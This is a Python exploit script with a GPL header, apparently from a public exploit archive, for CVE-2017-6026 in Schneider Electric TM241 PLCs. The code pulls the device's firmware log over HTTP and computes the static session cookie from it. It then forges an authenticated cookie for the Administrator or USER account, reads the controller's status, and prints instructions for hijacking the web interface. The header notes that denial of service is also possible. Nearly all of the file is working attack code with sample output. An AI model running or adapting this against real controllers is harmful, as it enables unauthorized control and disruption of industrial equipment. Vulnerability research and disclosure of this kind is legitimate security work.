&#039;&#039;&#039; 
	Copyright 2018 Photubias(c)
	# Exploit Title: Schneider Session Calculation - CVE-2017-6026
	# Date: 2018-09-30
	# Exploit Author: Deneut Tijl
	# Vendor Homepage: www.schneider-electric.com
	# Software Link: https://www.schneider-electric.com/en/download/document/M241-M251+Firmware+v4.0.3.20/
	# Version: Schneider Electric PLC 4.0.2.11 & Boot v0.0.2.11
	# CVE : CVE-2017-6026

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.

        File name CVE-2017-6026-SchneiderSessionCalculation.py
        written by tijl[dot]deneut[at]howest[dot]be

        Tested on the Schneider TM241 PLC with Firmware 4.0.2.11 & Boot 0.0.2.11.
        Firmware: https://www.schneider-electric.com/en/download/document/M241-M251+Firmware+v4.0.3.20/
        Security Note: https://www.schneider-electric.com/en/download/document/SEVD-2017-075-02/

        This script will calculate the website session cookie, which is static after every reboot.
        (This cookie is actually the Epoch time at PLC startup)
                E.g. Administrator (with default password &#039;admin&#039;)
                or   USER (with default password &#039;USER&#039;)

		After retrieving the cookie, various website actions are possible (including a DoS).
		Sample output:
		C:\Users\admin\Desktop>SchneiderGetSession.py
		Please enter an IP [10.10.36.224]:
		This device has booted 33 times
		Cookie: 1521612584 (22/03/2018 06:09:44.014)
		----------------
		--- Device:      TM241CE40R
		--- MAC Address: 0080F40B24E0
		--- Firmware:    4.0.2.11
		--- Controller:  Running
		----------------
		Press Enter to close
&#039;&#039;&#039;
import urllib2

strIP = raw_input(&#039;Please enter an IP [10.10.36.224]: &#039;)
if strIP == &#039;&#039;: strIP = &#039;10.10.36.224&#039;
FwLogURL = &#039;http://&#039; + strIP + &#039;/usr/Syslog/FwLog.txt&#039;
try:
    FwLogResp = urllib2.urlopen(urllib2.Request(FwLogURL)).readlines()
    NumberOfPowerOns = 0
    for line in FwLogResp:
        if &#039;Firmware core2&#039; in line:
            NumberOfPowerOns += 1
            CookieVal = line.split(&#039; &#039;)[1]
            BootupTime = line.split(&#039;(&#039;)[1].split(&#039;)&#039;)[0]
    NumberOfPowerOns /= 2
except:
    print(&#039;Error: URL not found.&#039;)
    raw_input(&#039;Press enter to exit&#039;)
    exit()

try:
    CookieVal
except:
    print(&#039;Error: &#039; + FwLogURL + &#039; does not contain the necessary data.&#039;)
    raw_input(&#039;Press Enter to Exit&#039;)
    exit()

print(&#039;This device has booted &#039; + str(NumberOfPowerOns) + &#039; times&#039;)
print(&#039;Cookie: &#039; + CookieVal + &#039; (&#039; + BootupTime + &#039;)&#039;)
print(&#039;----------------&#039;)
raw_input(&#039;Press enter to see if the cookie is set on the webserver.&#039;+"\n")

CtrlURL = &#039;http://&#039; + strIP + &#039;/plcExchange/getValues/&#039;
CtrlPost = &#039;S;100;0;136;s;s;S;2;0;24;w;d;S;1;0;8;B;d;S;1;0;9;B;d;S;1;0;10;B;d;S;1;0;11;B;d;&#039;

try:
    CtrlUser = &#039;Administrator&#039;
    DataReq = urllib2.Request(CtrlURL, CtrlPost, headers={&#039;Cookie&#039;:&#039;M258_LOG=&#039; + CtrlUser + &#039;:&#039; + CookieVal})
    DataResp = urllib2.urlopen(DataReq).read()
except:
    print(&#039;Failure for user \&#039;Administrator\&#039;&#039;)
    try:
        CtrlUser = &#039;USER&#039;
        DataReq = urllib2.Request(CtrlURL, CtrlPost, headers={&#039;Cookie&#039;:&#039;M258_LOG=&#039; + CtrlUser + &#039;:&#039; + CookieVal})
        DataResp = urllib2.urlopen(DataReq).read()
    except:
        print(&#039;Failure for user \&#039;USER\&#039;&#039;)
        raw_input(&#039;Press enter to exit&#039;)
print(&#039;### SUCCESS (&#039; + CtrlUser + &#039;) ###&#039;)
print(&#039;--- Device:      &#039; + DataResp.split(&#039; &#039;)[0])
print(&#039;--- MAC Address: &#039; + DataResp.split(&#039;;&#039;)[0].split(&#039; &#039;)[1][1:])
print(&#039;--- Firmware:    &#039; + DataResp.split(&#039;;&#039;)[2] + &#039;.&#039; + DataResp.split(&#039;;&#039;)[3] + &#039;.&#039; +DataResp.split(&#039;;&#039;)[4] + &#039;.&#039; +DataResp.split(&#039;;&#039;)[5])
state = DataResp.split(&#039;;&#039;)[1]
if state == &#039;2&#039;:
    print(&#039;--- Controller:  Running&#039;)
elif state == &#039;1&#039;:
    print(&#039;--- Controller:  Stopped&#039;)
elif state == &#039;0&#039;:
    print(&#039;--- Controller:  ERROR mode&#039;)
print(&#039;&#039;)
print(&#039;--- To exploit: Create cookie for domain "&#039;+strIP+&#039;"&#039;)
print(&#039;    with name "M258_LOG" and value "&#039;+CtrlUser+&#039;:&#039;+CookieVal+&#039;"&#039;)
print(&#039;    and open "http://&#039;+strIP+&#039;/index2.htm"&#039;)
print(&#039;&#039;)
print(&#039;----------------&#039;)

raw_input(&#039;Press enter to close&#039;)
exit()

